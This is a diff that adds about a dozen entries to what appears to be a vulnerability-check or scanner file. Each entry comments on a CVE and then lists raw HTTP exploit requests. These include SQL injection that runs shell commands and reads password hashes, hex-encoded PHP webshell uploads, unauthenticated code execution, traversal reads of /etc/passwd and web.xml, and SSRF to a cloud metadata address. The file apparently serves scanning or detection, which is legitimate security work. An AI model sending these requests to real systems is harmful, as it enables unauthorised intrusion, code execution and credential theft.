@@ -4582,3 +4582,52 @@ POST /cacti/data_input.php header="Content-Type: application/x-www-form-urlencod
 # --- CVE-2026-54630 (Part-DB): the attachment handler keeps the client
 #     supplied .phar extension under the web-served media directory. ---
 POST /part/1/attachments header="Content-Type: multipart/form-data; boundary=X" bodyhex=2d2d580d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c65223b2066696c656e616d653d22636f6d706f6e656e742e70686172220d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6f637465742d73747265616d0d0a0d0a3c3f706870206563686f20313b203f3e0d0a2d2d582d2d0d0a
+
+# --- CVE-2026-49869 (Kestra, KEV): AuthenticationFilter treats any path
+#     ending in /configs as public, so a flow named configs is created and
+#     executed without credentials; the default script plugin runs commands. ---
+PUT /api/v1/main/flows/tutorial/configs header="Content-Type: application/x-yaml" body="id: configs"
+POST /api/v1/main/executions/tutorial/configs header="Content-Type: application/x-yaml" body="namespace: tutorial"
+
+# --- CVE-2026-9586 (Sangoma Switchvox, KEV): /pa parses Polycom XML and
+#     concatenates PhoneIP into PostgreSQL, allowing unauthenticated SQL
+#     statements and COPY ... TO PROGRAM command execution. ---
+POST /pa header="Content-Type: application/xml" body="<PolycomIPPhone><PhoneIP>10.0.0.1'; SELECT pg_sleep(5)--</PhoneIP></PolycomIPPhone>"
+POST /pa header="Content-Type: application/xml" body="<PolycomIPPhone><PhoneIP>10.0.0.1'; COPY (SELECT '') TO PROGRAM 'id'--</PhoneIP></PolycomIPPhone>"
+
+# --- CVE-2026-56291 (Balbooa Forms, KEV): the frontend attachment upload
+#     accepts an anonymous .php file and stores it under the web root. ---
+POST /index.php?option=com_baforms&task=form.uploadAttachmentFile header="Content-Type: multipart/form-data; boundary=X" bodyhex=2d2d580d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c65223b2066696c656e616d653d227368656c6c2e706870220d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7068700d0a0d0a3c3f706870206563686f20313b203f3e0d0a2d2d582d2d0d0a
+
+# --- CVE-2026-9198 (IBM Langflow, KEV): unauthenticated auto_login mints a
+#     SUPERUSER token, then /api/v1/validate/code executes the supplied code. ---
+POST /api/v1/validate/code header="Content-Type: application/json" body="{\"code\":\"__import__('os').system('id')\"}"
+
+# --- CVE-2026-116067 (Paisa): the editor handlers join the client file name
+#     to the journal directory and read or delete outside it. ---
+POST /api/editor/file header="Content-Type: application/json" body="{\"name\":\"../../../../etc/passwd\"}"
+POST /api/editor/file/delete_backups header="Content-Type: application/json" body="{\"name\":\"../../../../etc/passwd\"}"
+
+# --- CVE-2026-116207 (YesWiki): the public Bazar search API puts the query
+#     field name inside a backtick alias, allowing subquery SQL injection. ---
+GET /api/forms/1/entries?query=x%60%2C(SELECT+SLEEP(30))+as+%60d!=x
+
+# --- CVE-2026-116211 (YesWiki): date_maj_fiche is concatenated into the
+#     entry INSERT without escaping, allowing a sub-SELECT read oracle. ---
+POST /?api/entries/MyForm header="Content-Type: application/x-www-form-urlencoded" body="bf_titre=x&antispam=1&date_maj_fiche=2020-01-01 00:00:00\", owner=0x61, user=0x61, latest=0x59, body=(SELECT CONCAT(name,0x3a,password) FROM wiki_users LIMIT 1), body_r=0x20 -- -"
+
+# --- CVE-2026-116171 (SiYuan, Windows): the NT extended-length prefix
+#     defeats the sensitive-path denylist on the markdown import handler. ---
+POST /api/import/importStdMd header="Content-Type: application/json" bodyhex=7b226e6f7465626f6f6b223a223230323630383031222c226c6f63616c50617468223a225c5c5c5c3f5c5c433a5c5c776f726b73706163655c5c636f6e66222c22746f50617468223a222f227d
+
+# --- CVE-2026-116176 (vLLM): X-Request-Id carries a P2pNcclConnector routing
+#     token that makes the prefill worker connect to an attacker-chosen host. ---
+POST /v1/chat/completions header="Content-Type: application/json" header="X-Request-Id: 7f3a___decode_addr_169.254.169.254:80" body="{\"model\":\"m\",\"messages\":[]}"
+
+# --- CVE-2021-48013 (Weaver E-cology): unauthenticated file read through
+#     fpath on ln.FileDownload, using an encoded traversal variant. ---
+GET /weaver/ln.FileDownload?fpath=..%2f..%2f..%2f..%2fWEB-INF%2Fweb.xml
+
+# --- CVE-2022-51025 (WAPPLES): file read through the name parameter of
+#     /webapi/file/transfer; the systemi account is hard-coded. ---
+GET /webapi/file/transfer?type=db_backup&name=../../../../etc/passwd
